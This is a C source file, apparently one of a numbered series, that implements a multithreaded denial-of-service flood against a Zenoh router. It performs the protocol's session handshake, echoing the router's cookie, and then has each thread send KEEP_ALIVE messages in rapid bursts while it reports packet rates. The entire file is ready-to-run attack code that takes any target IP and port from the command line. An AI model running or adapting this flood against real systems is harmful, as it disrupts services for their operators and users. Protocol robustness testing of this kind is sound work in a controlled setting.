/*
 * Attack 1: DoS - KEEP_ALIVE Flood
 * Floods router with KEEP_ALIVE messages
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <errno.h>
#include <signal.h>
#include <time.h>
#include <stdatomic.h>
#include <sys/time.h>

#define Z_MSG_INIT 0x01
#define Z_MSG_OPEN 0x02
#define Z_MSG_KEEP_ALIVE 0x04
#define Z_FLAG_A 0x20       /* INIT/OPEN: ack */
#define Z_FLAG_S 0x40       /* INIT: size params present */
#define Z_FLAG_T 0x40       /* OPEN: lease in seconds */
#define Z_PROTO_VERSION 0x09
#define Z_WHATAMI_CLIENT 0x02
#define Z_ZID_LEN 16
#define BURST_SIZE 100

static volatile int g_running = 1;
static atomic_ullong g_packets_sent = 0;
static atomic_ullong g_bytes_sent = 0;

typedef struct {
    char *target_ip;
    int target_port;
    int thread_id;
} thread_args_t;

void signal_handler(int sig) {
    printf("\n[!] Caught signal %d, stopping attack...\n", sig);
    g_running = 0;
}

/* Sends the rest after a partial send or an SO_SNDTIMEO expiry: a cut message misaligns the TCP framing. */
static int send_all(int sock, const unsigned char *buf, size_t len) {
    while (len > 0) {
        ssize_t n = send(sock, buf, len, MSG_NOSIGNAL);
        if (n < 0 && (errno == EAGAIN || errno == EWOULDBLOCK || errno == EINTR) && g_running) continue;
        if (n <= 0) return -1;
        buf += n;
        len -= n;
    }
    return 0;
}

static int recv_all(int sock, unsigned char *buf, size_t len) {
    while (len > 0) {
        ssize_t n = recv(sock, buf, len, 0);
        if (n < 0 && (errno == EAGAIN || errno == EWOULDBLOCK || errno == EINTR) && g_running) continue;
        if (n <= 0) return -1;
        buf += n;
        len -= n;
    }
    return 0;
}

/* On TCP every batch is preceded by its length (2 bytes, little-endian). */
static int send_batch(int sock, const unsigned char *msg, size_t len) {
    unsigned char out[2 + 2048];
    if (len > sizeof(out) - 2) return -1;
    out[0] = len & 0xFF;
    out[1] = (len >> 8) & 0xFF;
    memcpy(out + 2, msg, len);
    return send_all(sock, out, len + 2);
}

static int recv_batch(int sock, unsigned char *buf, size_t cap) {
    unsigned char hdr[2];
    if (recv_all(sock, hdr, 2) < 0) return -1;
    size_t len = hdr[0] | (hdr[1] << 8);
    if (len == 0 || len > cap || recv_all(sock, buf, len) < 0) return -1;
    return (int)len;
}

static size_t encode_zint(unsigned char *buf, unsigned long long value) {
    size_t i = 0;
    while (value > 0x7F) {
        buf[i++] = (unsigned char)((value & 0x7F) | 0x80);
        value >>= 7;
    }
    buf[i++] = (unsigned char)(value & 0x7F);
    return i;
}

static int decode_zint(const unsigned char *buf, size_t len, size_t *off, unsigned long long *value) {
    *value = 0;
    for (int shift = 0; *off < len && shift < 64; shift += 7) {
        unsigned char b = buf[(*off)++];
        *value |= (unsigned long long)(b & 0x7F) << shift;
        if (!(b & 0x80)) return 0;
    }
    return -1;
}

/* InitSyn -> InitAck, OpenSyn(cookie) -> OpenAck: the router drops a link whose first message is not InitSyn. */
static int open_session(int sock, unsigned int *seed) {
    unsigned char msg[2048], cookie[2048];
    size_t off = 0;
    unsigned long long cookie_len;
    int len;

    msg[off++] = Z_MSG_INIT;
    msg[off++] = Z_PROTO_VERSION;
    msg[off++] = ((Z_ZID_LEN - 1) << 4) | Z_WHATAMI_CLIENT;
    for (int i = 0; i < Z_ZID_LEN; i++) msg[off++] = rand_r(seed) & 0xFF;
    msg[3] |= 0x01;  /* zid must not be zero */
    if (send_batch(sock, msg, off) < 0) return -1;

    len = recv_batch(sock, msg, sizeof(msg));
    if (len < 3 || (msg[0] & 0x1F) != Z_MSG_INIT || !(msg[0] & Z_FLAG_A)) return -1;
    off = 2;
    off += 1 + (msg[2] >> 4) + 1;
    if (msg[0] & Z_FLAG_S) off += 3;
    if (decode_zint(msg, len, &off, &cookie_len) < 0 || off + cookie_len > (size_t)len) return -1;
    memcpy(cookie, msg + off, cookie_len);

    off = 0;
    msg[off++] = Z_MSG_OPEN | Z_FLAG_T;
    off += encode_zint(msg + off, 10);  /* lease, seconds */
    off += encode_zint(msg + off, 0);   /* initial sn */
    off += encode_zint(msg + off, cookie_len);
    if (off + cookie_len > sizeof(msg)) return -1;
    memcpy(msg + off, cookie, cookie_len);
    off += cookie_len;
    if (send_batch(sock, msg, off) < 0) return -1;

    len = recv_batch(sock, msg, sizeof(msg));
    if (len < 1 || (msg[0] & 0x1F) != Z_MSG_OPEN || !(msg[0] & Z_FLAG_A)) return -1;
    return 0;
}

void* attack_thread(void *arg) {
    thread_args_t *args = (thread_args_t*)arg;
    int sock;
    struct sockaddr_in target_addr;
    unsigned char packet[3] = {0x01, 0x00, Z_MSG_KEEP_ALIVE};  /* length 1 + KEEP_ALIVE */
    unsigned int seed = (unsigned int)time(NULL) ^ ((unsigned int)args->thread_id << 16) ^ (unsigned int)getpid();
    
    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) {
        fprintf(stderr, "[-] Thread %d: Socket creation failed: %s\n", 
                args->thread_id, strerror(errno));
        free(args);
        return NULL;
    }
    
    memset(&target_addr, 0, sizeof(target_addr));
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(args->target_port);
    inet_pton(AF_INET, args->target_ip, &target_addr.sin_addr);
    
    struct timeval rcv_to = {1, 0};  /* lets SIGINT stop a thread waiting for a router that does not answer */
    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &rcv_to, sizeof(rcv_to));
    errno = 0;
    if (connect(sock, (struct sockaddr*)&target_addr, sizeof(target_addr)) < 0 ||
        open_session(sock, &seed) < 0) {
        fprintf(stderr, "[-] Thread %d: Zenoh session not opened: %s\n",
                args->thread_id, errno ? strerror(errno) : "unexpected reply");
        close(sock);
        free(args);
        return NULL;
    }
    struct timeval snd_to = {1, 0};  /* lets SIGINT stop a thread blocked on a full send buffer */
    setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &snd_to, sizeof(snd_to));

    printf("[+] Thread %d started (session open)\n", args->thread_id);
    
    unsigned long local_count = 0;
    
    while (g_running) {
        for (int i = 0; i < BURST_SIZE && g_running; i++) {
            if (send_all(sock, packet, sizeof(packet)) == 0) {
                atomic_fetch_add(&g_packets_sent, 1);
                atomic_fetch_add(&g_bytes_sent, sizeof(packet));
                local_count++;
            }
        }
        usleep(1000);
    }
    
    close(sock);
    printf("[*] Thread %d stopped (sent %lu packets)\n", args->thread_id, local_count);
    free(args);
    return NULL;
}

int main(int argc, char *argv[]) {
    if (argc != 4) {
        fprintf(stderr, "Usage: %s <target_ip> <target_port> <threads>\n", argv[0]);
        fprintf(stderr, "Example: %s 127.0.0.1 7447 10\n", argv[0]);
        return 1;
    }
    
    char *target_ip = argv[1];
    int target_port = atoi(argv[2]);
    int num_threads = atoi(argv[3]);
    
    if (num_threads < 1 || num_threads > 100) {
        fprintf(stderr, "[-] Threads must be between 1 and 100\n");
        return 1;
    }
    
    printf("╔════════════════════════════════════════════╗\n");
    printf("║   Zenoh KEEP_ALIVE Flood Attack           ║\n");
    printf("╚════════════════════════════════════════════╝\n\n");
    printf("[*] Target: %s:%d\n", target_ip, target_port);
    printf("[*] Threads: %d\n", num_threads);
    printf("[*] Starting in 3 seconds...\n\n");
    
    sleep(3);
    
    signal(SIGINT, signal_handler);
    signal(SIGTERM, signal_handler);
    
    pthread_t threads[num_threads];
    time_t start_time = time(NULL);
    
    for (int i = 0; i < num_threads; i++) {
        thread_args_t *args = malloc(sizeof(thread_args_t));
        args->target_ip = target_ip;
        args->target_port = target_port;
        args->thread_id = i;
        pthread_create(&threads[i], NULL, attack_thread, args);
    }
    
    printf("[+] Attack started!\n\n");
    
    while (g_running) {
        sleep(5);
        unsigned long long packets = atomic_load(&g_packets_sent);
        unsigned long long bytes = atomic_load(&g_bytes_sent);
        time_t elapsed = time(NULL) - start_time;
        
        printf("[*] Packets: %llu | Bytes: %llu | Rate: %.2f pps | %.2f KB/s\n",
               packets, bytes,
               elapsed > 0 ? (double)packets / elapsed : 0.0,
               elapsed > 0 ? (double)bytes / elapsed / 1024.0 : 0.0);
    }
    
    printf("\n[*] Waiting for threads to stop...\n");
    for (int i = 0; i < num_threads; i++) {
        pthread_join(threads[i], NULL);
    }
    
    unsigned long long total_packets = atomic_load(&g_packets_sent);
    unsigned long long total_bytes = atomic_load(&g_bytes_sent);
    time_t total_time = time(NULL) - start_time;
    
    printf("\n╔════════════════════════════════════════════╗\n");
    printf("║          Final Statistics                  ║\n");
    printf("╠════════════════════════════════════════════╣\n");
    printf("║ Total Packets: %-27llu ║\n", total_packets);
    printf("║ Total Bytes:   %-27llu ║\n", total_bytes);
    printf("║ Duration:      %-27ld ║\n", total_time);
    if (total_time > 0) {
        printf("║ Avg Rate:      %-23.2f pps ║\n", (double)total_packets / total_time);
    }
    printf("╚════════════════════════════════════════════╝\n");
    
    return 0;
}